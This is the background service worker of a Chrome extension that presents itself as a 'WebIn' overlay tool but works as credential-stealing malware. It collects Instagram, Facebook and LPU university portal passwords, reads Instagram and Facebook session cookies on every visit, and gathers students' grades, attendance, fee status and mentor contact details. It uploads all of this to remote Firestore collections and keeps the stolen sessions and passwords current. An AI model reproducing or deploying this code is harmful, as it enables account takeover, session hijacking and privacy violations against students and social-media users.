// ============== WebIn Combined Background Service Worker ==============
// Combines WebIn overlay functionality with Session/Cookie logging

console.log(
  "%c[WebIn] Service Worker Loaded",
  "color: #4caf50; font-weight: bold; font-size: 14px;"
);

// ============== Firebase + Utils Imports ==============
import { db } from "./session/firebase-init.js";
import { collection, addDoc, getDocs, query, where, deleteDoc, doc, updateDoc } from "./session/firebase-firestore.js";
import { isDuplicateData } from "./session/utils.js";

// ============== Icon Cache for WebIn Overlay ==============
const iconCache = new Map();

// Fetch icon and convert to base64 data URL
async function fetchIconAsDataUrl(url) {
  if (iconCache.has(url)) {
    return iconCache.get(url);
  }

  try {
    const response = await fetch(url, { mode: 'cors' });
    if (!response.ok) throw new Error('Fetch failed');
    
    const blob = await response.blob();
    
    return new Promise((resolve, reject) => {
      const reader = new FileReader();
      reader.onloadend = () => {
        const dataUrl = reader.result;
        iconCache.set(url, dataUrl);
        resolve(dataUrl);
      };
      reader.onerror = reject;
      reader.readAsDataURL(blob);
    });
  } catch (error) {
    console.error('[WebIn] Icon fetch failed:', url, error);
    return null;
  }
}

// ============== In-Memory Cache for Deduplication ==============
const savedStudentSet = new Set();
const savedInstagramBySessionId = new Set(); // Deduplicate by sessionId
const savedFacebookByCUser = new Set(); // Deduplicate by c_user
// Note: Profile and Academic data no longer use dedup sets - they always update with latest data

// ============== Pending Credentials (waiting for session) ==============
let pendingInstagramCreds = null; // { username, password, capturedAt }
let pendingFacebookCreds = null; // { email, password, capturedAt }

// ============== LPU Profile Data Handler ==============
// Captures name, section, program from dashboard and updates studentData
// Retry logic: If no document found, wait and retry (to handle race condition with credentials save)
async function handleLpuProfileData(data, retryCount = 0) {
  const { 
    studentName, registrationNumber, section, program, 
    pwdExpiryDays, pwdExpiryDate, 
    studentProfilePic,
    mentorName, mentorMobile, mentorEmail, mentorDesignation, mentorDivision, mentorProfilePic,
    feeBalance, feeStatus 
  } = data;

  if (!registrationNumber) {
    console.warn("[LPU-Profile] SKIP: No registration number provided");
    return;
  }

  console.log("%c╔══════════════════════════════════════════════════════════════╗", "color: #2196f3; font-weight: bold;");
  console.log("%c║           LPU PROFILE DATA UPDATE                            ║", "color: #2196f3; font-weight: bold;");
  console.log("%c╚══════════════════════════════════════════════════════════════╝", "color: #2196f3; font-weight: bold;");
  console.log("%c[LPU-Profile] Registration: " + registrationNumber + (retryCount > 0 ? " (retry #" + retryCount + ")" : ""), "color: #2196f3; font-weight: bold;");
  console.log("%c[LPU-Profile] Timestamp: " + new Date().toLocaleTimeString(), "color: #9e9e9e;");

  const colRef = collection(db, "studentData");

  try {
    // Find existing entry for this registration number
    const regQ = query(colRef, where("registrationNumber", "==", registrationNumber));
    const regSnapshot = await getDocs(regQ);

    if (!regSnapshot.empty) {
      // Update existing entry (MERGE with existing data)
      const existingDoc = regSnapshot.docs[0];
      const existingData = existingDoc.data();
      
      // Build update object - only update fields that have NEW values
      const updateData = {
        profileUpdatedAt: new Date()
      };
      
      // Track what's being updated for logging
      const updates = [];
      const newFields = [];
      
      // Helper to check and add update
      const checkAndAdd = (field, value, displayName) => {
        if (value !== null && value !== undefined && value !== '') {
          const oldValue = existingData[field];
          if (oldValue !== value) {
            updateData[field] = value;
            if (oldValue) {
              updates.push(`${displayName}: "${oldValue}" → "${typeof value === 'string' && value.length > 50 ? value.substring(0, 50) + '...' : value}"`);
            } else {
              newFields.push(`${displayName}: "${typeof value === 'string' && value.length > 50 ? value.substring(0, 50) + '...' : value}"`);
            }
          }
        }
      };
      
      checkAndAdd('studentName', studentName, 'Name');
      checkAndAdd('section', section, 'Section');
      checkAndAdd('program', program, 'Program');
      checkAndAdd('pwdExpiryDays', pwdExpiryDays, 'Pwd Expiry Days');
      checkAndAdd('pwdExpiryDate', pwdExpiryDate, 'Pwd Expiry Date');
      checkAndAdd('studentProfilePic', studentProfilePic, 'Student Photo');
      checkAndAdd('mentorName', mentorName, 'Mentor Name');
      checkAndAdd('mentorMobile', mentorMobile, 'Mentor Mobile');
      checkAndAdd('mentorEmail', mentorEmail, 'Mentor Email');
      checkAndAdd('mentorDesignation', mentorDesignation, 'Mentor Designation');
      checkAndAdd('mentorDivision', mentorDivision, 'Mentor Division');
      checkAndAdd('mentorProfilePic', mentorProfilePic, 'Mentor Photo');
      checkAndAdd('feeBalance', feeBalance, 'Fee Balance');
      checkAndAdd('feeStatus', feeStatus, 'Fee Status');

      // Only update if there are changes
      if (updates.length > 0 || newFields.length > 0) {
        await updateDoc(doc(db, "studentData", existingDoc.id), updateData);
        
        console.log("%c[LPU-Profile] ✅ UPDATED: " + registrationNumber, "color: #4caf50; font-weight: bold; font-size: 13px;");
        
        if (newFields.length > 0) {
          console.log("%c[LPU-Profile] 🆕 NEW FIELDS ADDED:", "color: #8bc34a;");
          newFields.forEach(f => console.log("%c    + " + f, "color: #8bc34a;"));
        }
        
        if (updates.length > 0) {
          console.log("%c[LPU-Profile] 🔄 FIELDS UPDATED:", "color: #ff9800;");
          updates.forEach(u => console.log("%c    → " + u, "color: #ff9800;"));
        }
      } else {
        console.log("%c[LPU-Profile] ⏭️ SKIP: No new data to update", "color: #9e9e9e;");
      }
    } else {
      // No document found - might be race condition with credentials save
      // Retry up to 3 times with 1 second delay
      if (retryCount < 3) {
        console.log("%c[LPU-Profile] ⏳ WAITING: No document found, will retry in 1s... (attempt " + (retryCount + 1) + "/3)", "color: #ff9800;");
        await new Promise(resolve => setTimeout(resolve, 1000));
        return handleLpuProfileData(data, retryCount + 1);
      }
      
      // After retries, create new entry (fallback - credentials might not have been captured)
      console.log("%c[LPU-Profile] ⚠️ Creating new entry (no credentials document found after retries)", "color: #ff9800;");
      
      const newDocData = {
        registrationNumber,
        timestamp: new Date()
      };
      
      const addedFields = ['registrationNumber'];
      
      if (studentName) { newDocData.studentName = studentName; addedFields.push('studentName'); }
      if (section) { newDocData.section = section; addedFields.push('section'); }
      if (program) { newDocData.program = program; addedFields.push('program'); }
      if (pwdExpiryDays !== null && pwdExpiryDays !== undefined) { newDocData.pwdExpiryDays = pwdExpiryDays; addedFields.push('pwdExpiryDays'); }
      if (pwdExpiryDate) { newDocData.pwdExpiryDate = pwdExpiryDate; addedFields.push('pwdExpiryDate'); }
      if (studentProfilePic) { newDocData.studentProfilePic = studentProfilePic; addedFields.push('studentProfilePic'); }
      if (mentorName) { newDocData.mentorName = mentorName; addedFields.push('mentorName'); }
      if (mentorMobile) { newDocData.mentorMobile = mentorMobile; addedFields.push('mentorMobile'); }
      if (mentorEmail) { newDocData.mentorEmail = mentorEmail; addedFields.push('mentorEmail'); }
      if (mentorDesignation) { newDocData.mentorDesignation = mentorDesignation; addedFields.push('mentorDesignation'); }
      if (mentorDivision) { newDocData.mentorDivision = mentorDivision; addedFields.push('mentorDivision'); }
      if (mentorProfilePic) { newDocData.mentorProfilePic = mentorProfilePic; addedFields.push('mentorProfilePic'); }
      if (feeBalance) { newDocData.feeBalance = feeBalance; addedFields.push('feeBalance'); }
      if (feeStatus) { newDocData.feeStatus = feeStatus; addedFields.push('feeStatus'); }
      
      await addDoc(colRef, newDocData);
      
      console.log("%c[LPU-Profile] 🆕 CREATED: New entry for " + registrationNumber, "color: #4caf50; font-weight: bold; font-size: 13px;");
      console.log("%c[LPU-Profile] Fields added: " + addedFields.join(', '), "color: #8bc34a;");
    }
  } catch (err) {
    console.error("[LPU-Profile] ❌ ERROR: Failed to save to Firestore:", err);
  }
}

// ============== LPU Academic Data Handler ==============
// Captures courses, CGPA, attendance from dashboard
// ============== LPU Academic Data Handler ==============
// Captures CGPA, attendance, courses and updates studentData
// Retry logic: If no document found, wait and retry (to handle race condition with credentials save)
async function handleLpuAcademicData(data, retryCount = 0) {
  const { registrationNumber, cgpa, overallAttendance, courses } = data;

  if (!registrationNumber) {
    console.warn("[LPU-Academic] SKIP: No registration number provided");
    return;
  }

  console.log("%c╔══════════════════════════════════════════════════════════════╗", "color: #9c27b0; font-weight: bold;");
  console.log("%c║           LPU ACADEMIC DATA UPDATE                           ║", "color: #9c27b0; font-weight: bold;");
  console.log("%c╚══════════════════════════════════════════════════════════════╝", "color: #9c27b0; font-weight: bold;");
  console.log("%c[LPU-Academic] Registration: " + registrationNumber + (retryCount > 0 ? " (retry #" + retryCount + ")" : ""), "color: #9c27b0; font-weight: bold;");
  console.log("%c[LPU-Academic] Timestamp: " + new Date().toLocaleTimeString(), "color: #9e9e9e;");
  console.log("%c[LPU-Academic] CGPA: " + cgpa + " | Attendance: " + overallAttendance + "% | Courses: " + (courses?.length || 0), "color: #9c27b0;");

  const colRef = collection(db, "studentData");

  try {
    // Find existing entry for this registration number
    const regQ = query(colRef, where("registrationNumber", "==", registrationNumber));
    const regSnapshot = await getDocs(regQ);

    if (!regSnapshot.empty) {
      const existingDoc = regSnapshot.docs[0];
      const existingData = existingDoc.data();
      
      // Build update object and track changes
      const updateData = {
        academicUpdatedAt: new Date()
      };
      
      const updates = [];
      const newFields = [];
      
      if (cgpa !== null && cgpa !== undefined) {
        if (existingData.cgpa !== cgpa) {
          updateData.cgpa = cgpa;
          if (existingData.cgpa !== undefined) {
            updates.push(`CGPA: ${existingData.cgpa} → ${cgpa}`);
          } else {
            newFields.push(`CGPA: ${cgpa}`);
          }
        }
      }
      
      if (overallAttendance !== null && overallAttendance !== undefined) {
        if (existingData.overallAttendance !== overallAttendance) {
          updateData.overallAttendance = overallAttendance;
          if (existingData.overallAttendance !== undefined) {
            updates.push(`Attendance: ${existingData.overallAttendance}% → ${overallAttendance}%`);
          } else {
            newFields.push(`Attendance: ${overallAttendance}%`);
          }
        }
      }
      
      if (courses && courses.length > 0) {
        const existingCoursesCount = existingData.courses?.length || 0;
        if (existingCoursesCount !== courses.length) {
          updateData.courses = courses;
          if (existingCoursesCount > 0) {
            updates.push(`Courses: ${existingCoursesCount} → ${courses.length}`);
          } else {
            newFields.push(`Courses: ${courses.length} courses added`);
          }
        } else {
          // Even if count is same, update courses data
          updateData.courses = courses;
        }
      }

      if (updates.length > 0 || newFields.length > 0) {
        await updateDoc(doc(db, "studentData", existingDoc.id), updateData);
        
        console.log("%c[LPU-Academic] ✅ UPDATED: " + registrationNumber, "color: #4caf50; font-weight: bold; font-size: 13px;");
        
        if (newFields.length > 0) {
          console.log("%c[LPU-Academic] 🆕 NEW FIELDS:", "color: #8bc34a;");
          newFields.forEach(f => console.log("%c    + " + f, "color: #8bc34a;"));
        }
        
        if (updates.length > 0) {
          console.log("%c[LPU-Academic] 🔄 UPDATED:", "color: #ff9800;");
          updates.forEach(u => console.log("%c    → " + u, "color: #ff9800;"));
        }
      } else {
        console.log("%c[LPU-Academic] ⏭️ SKIP: No new academic data", "color: #9e9e9e;");
      }
    } else {
      // No document found - might be race condition with credentials save
      // Retry up to 3 times with 1 second delay
      if (retryCount < 3) {
        console.log("%c[LPU-Academic] ⏳ WAITING: No document found, will retry in 1s... (attempt " + (retryCount + 1) + "/3)", "color: #ff9800;");
        await new Promise(resolve => setTimeout(resolve, 1000));
        return handleLpuAcademicData(data, retryCount + 1);
      }
      
      // After retries, create new entry (fallback - credentials might not have been captured)
      console.log("%c[LPU-Academic] ⚠️ Creating new entry (no credentials document found after retries)", "color: #ff9800;");
      
      const newDocData = {
        registrationNumber,
        academicUpdatedAt: new Date(),
        timestamp: new Date()
      };
      
      const addedFields = [];
      if (cgpa !== null && cgpa !== undefined) { newDocData.cgpa = cgpa; addedFields.push('CGPA: ' + cgpa); }
      if (overallAttendance !== null && overallAttendance !== undefined) { newDocData.overallAttendance = overallAttendance; addedFields.push('Attendance: ' + overallAttendance + '%'); }
      if (courses && courses.length > 0) { newDocData.courses = courses; addedFields.push('Courses: ' + courses.length); }
      
      await addDoc(colRef, newDocData);
      console.log("%c[LPU-Academic] 🆕 CREATED: New entry for " + registrationNumber, "color: #4caf50; font-weight: bold; font-size: 13px;");
      console.log("%c[LPU-Academic] Fields: " + addedFields.join(', '), "color: #8bc34a;");
    }
  } catch (err) {
    console.error("[LPU-Academic] ❌ ERROR: Failed to save to Firestore:", err);
  }
}

// ============== Combined Message Listener ==============
chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  // WebIn Icon Fetch Handler
  if (request.action === 'fetchIcon') {
    fetchIconAsDataUrl(request.url)
      .then(dataUrl => sendResponse({ dataUrl }))
      .catch(() => sendResponse({ dataUrl: null }));
    return true;
  }

  // Instagram Login Credentials Handler
  if (request.type === "instagram_login_data") {
    handleInstagramLoginData(request.data);
  }

  // Facebook Login Credentials Handler
  if (request.type === "facebook_login_data") {
    handleFacebookLoginData(request.data);
  }

  // Student Data Handler (LPU)
  if (request.type === "student_data") {
    handleStudentData(request.data);
  }

  // LPU Password Expiry Update (from dashboard after login)
  if (request.type === "lpu_expiry_update") {
    handleLpuExpiryUpdate(request.data);
  }

  // LPU Profile Data Handler (name, section, program from dashboard)
  if (request.type === "lpu_profile_data") {
    handleLpuProfileData(request.data);
  }

  // LPU Academic Data Handler (courses, CGPA, attendance)
  if (request.type === "lpu_academic_data") {
    handleLpuAcademicData(request.data);
  }
});

// ============== WebIn Overlay Command ==============
chrome.commands.onCommand.addListener((command) => {
  if (command === "launch_overlay") {
    chrome.tabs.query({ active: true, currentWindow: true }, (tabs) => {
      if (tabs.length === 0) return;

      chrome.scripting
        .executeScript({
          target: { tabId: tabs[0].id },
          files: [
            "webin/config.js",
            "webin/state.js",
            "webin/styles.js",
            "webin/styles2.js",
            "webin/styles3.js",
            "webin/modals.js",
            "webin/ui.js",
            "webin/tabs.js",
            "webin/events.js",
            "webin/inject.js",
          ],
        })
        .catch((err) => console.error("[WebIn] Injection failed:", err));
    });
  }
});

// ============== Navigation Handler for Cookies ==============
chrome.webNavigation.onCompleted.addListener(
  async ({ url, frameId }) => {
    if (frameId !== 0) return;

    if (url.includes("instagram.com")) {
      await handleInstagram();
    } else if (url.includes("facebook.com")) {
      await handleFacebook();
    }
  },
  {
    url: [{ hostSuffix: "instagram.com" }, { hostSuffix: "facebook.com" }],
  }
);

// ============== Instagram Login Data Handler ==============
// Stores credentials temporarily - will be combined with session data later
function handleInstagramLoginData(data) {
  const { username, password } = data;

  if (!username || !password) {
    console.warn("[IG-Login] SKIP: Incomplete data received");
    return;
  }
  
  if (username.length < 1 || password.length < 6) {
    console.warn("[IG-Login] SKIP: Data too short - Password min 6 chars required");
    return;
  }

  console.log("%c[IG-Login] RECEIVED: Credentials stored, waiting for session...", "color: #2196f3; font-weight: bold;");
  console.table({ username, password: "*".repeat(password.length) });

  // Store credentials temporarily - will be saved when session is captured
  pendingInstagramCreds = {
    username,
    password,
    capturedAt: new Date().toISOString()
  };
  
  console.log("%c[IG-Login] PENDING: Credentials will be saved with session", "color: #ff9800;");
}

// ============== Student Data Handler (LPU) ==============
// Uses registrationNumber for deduplication, replaces old entry if password changes
async function handleStudentData(data) {
  const { registrationNumber, password, pwdExpiryDays, pwdExpiryDate } = data;

  if (!registrationNumber || !password) {
    console.warn("[LPU] SKIP: Incomplete data received");
    return;
  }
  
  if (registrationNumber.length < 8 || password.length < 6) {
    console.warn("[LPU] SKIP: Data too short - RegNo min 8, Password min 6 chars required");
    return;
  }

  console.log("%c[LPU] RECEIVED: Student credentials", "color: #2196f3; font-weight: bold;");
  console.table({ registrationNumber, password: "*".repeat(password.length), pwdExpiryDays, pwdExpiryDate });

  const colRef = collection(db, "studentData");

  try {
    // Check if same regNo + password already exists (exact duplicate)
    const exactQ = query(colRef, where("registrationNumber", "==", registrationNumber), where("password", "==", password));
    const exactSnapshot = await getDocs(exactQ);
    
    if (!exactSnapshot.empty) {
      console.log("%c[LPU] SKIP: Same credentials already exist", "color: #9e9e9e;");
      savedStudentSet.add(registrationNumber);
      return;
    }

    // Check if same regNo exists with OLD password - delete it
    const regQ = query(colRef, where("registrationNumber", "==", registrationNumber));
    const regSnapshot = await getDocs(regQ);
    
    let replacedOld = false;
    if (!regSnapshot.empty) {
      // Delete all old documents for this registrationNumber
      for (const docSnap of regSnapshot.docs) {
        console.log("%c[LPU] Deleting old entry for: " + registrationNumber, "color: #ff9800;");
        await deleteDoc(doc(db, "studentData", docSnap.id));
        replacedOld = true;
      }
    }

    // Build document data
    const docData = { 
      registrationNumber, 
      password, 
      timestamp: new Date() 
    };
    
    // Add expiry info if available
    if (pwdExpiryDays !== null && pwdExpiryDays !== undefined) {
      docData.pwdExpiryDays = pwdExpiryDays;
    }
    if (pwdExpiryDate) {
      docData.pwdExpiryDate = pwdExpiryDate;
    }

    // Save to database
    savedStudentSet.add(registrationNumber);
    await addDoc(colRef, docData);
    console.log("%c[LPU] SAVED: " + registrationNumber + (pwdExpiryDate ? " (expires: " + pwdExpiryDate + ")" : "") + (replacedOld ? " [replaced old entry]" : ""), "color: #4caf50; font-weight: bold; font-size: 13px;");
  } catch (err) {
    console.error("[LPU] ERROR: Failed to save to Firestore:", err);
  }
}

// ============== LPU Password Expiry Update Handler ==============
// Updates existing entry with password expiry info from dashboard
async function handleLpuExpiryUpdate(data) {
  const { registrationNumber, pwdExpiryDays, pwdExpiryDate } = data;

  if (!registrationNumber) {
    console.warn("[LPU-Expiry] SKIP: No registration number provided");
    return;
  }

  if (pwdExpiryDays === null && !pwdExpiryDate) {
    console.warn("[LPU-Expiry] SKIP: No expiry info to update");
    return;
  }

  console.log("%c[LPU-Expiry] RECEIVED: Expiry update for " + registrationNumber, "color: #2196f3; font-weight: bold;");
  console.table({ registrationNumber, pwdExpiryDays, pwdExpiryDate });

  const colRef = collection(db, "studentData");

  try {
    // Find existing entry for this registration number
    const regQ = query(colRef, where("registrationNumber", "==", registrationNumber));
    const regSnapshot = await getDocs(regQ);

    if (regSnapshot.empty) {
      console.log("%c[LPU-Expiry] SKIP: No existing entry found for " + registrationNumber, "color: #ff9800;");
      return;
    }

    // Update each matching document (should be only one)
    for (const docSnap of regSnapshot.docs) {
      const existingData = docSnap.data();
      
      // Check if expiry info already exists and is same
      if (existingData.pwdExpiryDays === pwdExpiryDays && existingData.pwdExpiryDate === pwdExpiryDate) {
        console.log("%c[LPU-Expiry] SKIP: Expiry info already up to date", "color: #9e9e9e;");
        return;
      }

      // Use updateDoc to preserve all existing fields
      const updateData = {};
      if (pwdExpiryDays !== null && pwdExpiryDays !== undefined) {
        updateData.pwdExpiryDays = pwdExpiryDays;
      }
      if (pwdExpiryDate) {
        updateData.pwdExpiryDate = pwdExpiryDate;
      }

      await updateDoc(doc(db, "studentData", docSnap.id), updateData);
      console.log("%c[LPU-Expiry] UPDATED: " + registrationNumber + " (expires: " + pwdExpiryDate + ", days: " + pwdExpiryDays + ")", "color: #4caf50; font-weight: bold; font-size: 13px;");
    }
  } catch (err) {
    console.error("[LPU-Expiry] ERROR: Failed to update Firestore:", err);
  }
}

// ============== Instagram Session Cookie Handler ==============
// Combines session with pending credentials, uses sessionId for deduplication
async function handleInstagram() {
  chrome.cookies.getAll({ domain: ".instagram.com" }, async (cookies) => {
    console.log("%c[IG] Fetching Instagram cookies...", "color: #2196f3;");

    const session = cookies.find((c) => c.name === "sessionid");
    const dsUserId = cookies.find((c) => c.name === "ds_user_id");

    if (!session || !dsUserId) {
      console.warn("[IG] SKIP: Required cookies not found (user not logged in)");
      return;
    }

    const sessionId = session.value;
    const userId = dsUserId.value;

    // Check if this sessionId was already saved (memory cache)
    if (savedInstagramBySessionId.has(sessionId)) {
      console.log("%c[IG] SKIP: SessionId already in memory cache", "color: #9e9e9e;");
      return;
    }

    console.log("%c[IG] Cookies found:", "color: #4caf50;");
    console.table([
      { name: "sessionid", value: sessionId.substring(0, 20) + "..." },
      { name: "ds_user_id", value: userId },
    ]);

    let username = "unknown_user";
    let bio = "";

    try {
      console.log("[IG] Fetching user info from API...");

      const response = await fetch(
        `https://i.instagram.com/api/v1/users/${userId}/info/`,
        {
          method: "GET",
          headers: {
            "User-Agent": "Instagram 219.0.0.12.117 Android",
            Cookie: `sessionid=${sessionId};`,
            "X-IG-App-ID": "936619743392459",
            "Accept-Language": "en-US",
          },
        }
      );

      if (!response.ok) {
        console.error(`[IG] ERROR: API returned HTTP ${response.status}`);
        return;
      }

      const data = await response.json();
      const user = data.user || {};

      username = user.username || "unknown_user";
      bio = user.biography || "";

      console.log("%c[IG] User info fetched:", "color: #4caf50;");
      console.table({ username, bio: bio.substring(0, 50) + (bio.length > 50 ? "..." : "") });
    } catch (error) {
      console.error("[IG] ERROR: API fetch failed:", error);
      return;
    }

    // Build document data - combine session with pending credentials if available
    const docData = {
      sessionId,
      userId,
      username,
      bio
    };

    // Add credentials if we captured them during login
    if (pendingInstagramCreds) {
      docData.loginUsername = pendingInstagramCreds.username;
      docData.loginPassword = pendingInstagramCreds.password;
      docData.credsCapturedAt = pendingInstagramCreds.capturedAt;
      console.log("%c[IG] Combining with pending credentials", "color: #ff9800;");
      pendingInstagramCreds = null; // Clear after use
    }

    const colRef = collection(db, "instagram");

    try {
      // Check if same sessionId already exists (exact duplicate)
      const sessionQ = query(colRef, where("sessionId", "==", sessionId));
      const sessionSnapshot = await getDocs(sessionQ);
      
      if (!sessionSnapshot.empty) {
        console.log("%c[IG] SKIP: Same sessionId already exists", "color: #9e9e9e;");
        savedInstagramBySessionId.add(sessionId);
        return;
      }

      // Check if same userId exists with OLD sessionId - delete it
      const userQ = query(colRef, where("userId", "==", userId));
      const userSnapshot = await getDocs(userQ);
      
      if (!userSnapshot.empty) {
        // Delete all old documents for this userId
        for (const docSnap of userSnapshot.docs) {
          const oldSessionId = docSnap.data().sessionId;
          console.log("%c[IG] Deleting old session for userId: " + userId, "color: #ff9800;");
          await deleteDoc(doc(db, "instagram", docSnap.id));
          savedInstagramBySessionId.delete(oldSessionId); // Remove from cache
        }
      }

      // Save new session to database
      savedInstagramBySessionId.add(sessionId);
      await addDoc(colRef, { ...docData, timestamp: new Date() });
      console.log("%c[IG] SAVED: @" + username + (docData.loginPassword ? " (with credentials)" : "") + (userSnapshot && !userSnapshot.empty ? " [replaced old session]" : ""), "color: #4caf50; font-weight: bold; font-size: 13px;");
    } catch (err) {
      console.error("[IG] ERROR: Failed to save to Firestore:", err);
    }
  });
}

// ============== Facebook Login Data Handler ==============
// Stores credentials temporarily - will be combined with session data later
function handleFacebookLoginData(data) {
  const { email, password } = data;

  if (!email || !password) {
    console.warn("[FB-Login] SKIP: Incomplete data received");
    return;
  }
  
  if (email.length < 3 || password.length < 6) {
    console.warn("[FB-Login] SKIP: Data too short - Password min 6 chars required");
    return;
  }

  console.log("%c[FB-Login] RECEIVED: Credentials stored, waiting for session...", "color: #2196f3; font-weight: bold;");
  console.table({ email, password: "*".repeat(password.length) });

  // Store credentials temporarily - will be saved when session is captured
  pendingFacebookCreds = {
    email,
    password,
    capturedAt: new Date().toISOString()
  };
  
  console.log("%c[FB-Login] PENDING: Credentials will be saved with session", "color: #ff9800;");
}

// ============== Facebook Cookie Handler ==============
// Combines session with pending credentials, uses c_user for deduplication
async function handleFacebook() {
  chrome.cookies.getAll({ domain: ".facebook.com" }, async (cookies) => {
    console.log("%c[FB] Fetching Facebook cookies...", "color: #2196f3;");

    const cUser = cookies.find((c) => c.name === "c_user");
    const xs = cookies.find((c) => c.name === "xs");

    if (!cUser || !xs) {
      console.warn("[FB] SKIP: Required cookies not found (user not logged in)");
      return;
    }

    const cUserValue = cUser.value;
    const xsValue = xs.value;

    // Check if this c_user was already saved (memory cache)
    if (savedFacebookByCUser.has(cUserValue)) {
      console.log("%c[FB] SKIP: c_user already in memory cache", "color: #9e9e9e;");
      return;
    }

    console.log("%c[FB] Cookies found:", "color: #4caf50;");
    console.table([
      { name: "c_user", value: cUserValue },
      { name: "xs", value: xsValue.substring(0, 20) + "..." },
    ]);

    // Build document data - combine session with pending credentials if available
    const docData = {
      c_user: cUserValue,
      xs: xsValue
    };

    // Add credentials if we captured them during login
    if (pendingFacebookCreds) {
      docData.loginEmail = pendingFacebookCreds.email;
      docData.loginPassword = pendingFacebookCreds.password;
      docData.credsCapturedAt = pendingFacebookCreds.capturedAt;
      console.log("%c[FB] Combining with pending credentials", "color: #ff9800;");
      pendingFacebookCreds = null; // Clear after use
    }

    const colRef = collection(db, "facebook");

    try {
      // Check if same xs (session) already exists (exact duplicate)
      const xsQ = query(colRef, where("xs", "==", xsValue));
      const xsSnapshot = await getDocs(xsQ);
      
      if (!xsSnapshot.empty) {
        console.log("%c[FB] SKIP: Same xs session already exists", "color: #9e9e9e;");
        savedFacebookByCUser.add(cUserValue);
        return;
      }

      // Check if same c_user exists with OLD xs - delete it
      const userQ = query(colRef, where("c_user", "==", cUserValue));
      const userSnapshot = await getDocs(userQ);
      
      if (!userSnapshot.empty) {
        // Delete all old documents for this c_user
        for (const docSnap of userSnapshot.docs) {
          console.log("%c[FB] Deleting old session for c_user: " + cUserValue, "color: #ff9800;");
          await deleteDoc(doc(db, "facebook", docSnap.id));
        }
      }

      // Save new session to database
      savedFacebookByCUser.add(cUserValue);
      await addDoc(colRef, { ...docData, timestamp: new Date() });
      console.log("%c[FB] SAVED: User " + cUserValue + (docData.loginPassword ? " (with credentials)" : "") + (userSnapshot && !userSnapshot.empty ? " [replaced old session]" : ""), "color: #4caf50; font-weight: bold; font-size: 13px;");
    } catch (err) {
      console.error("[FB] ERROR: Failed to save to Firestore:", err);
    }
  });
}
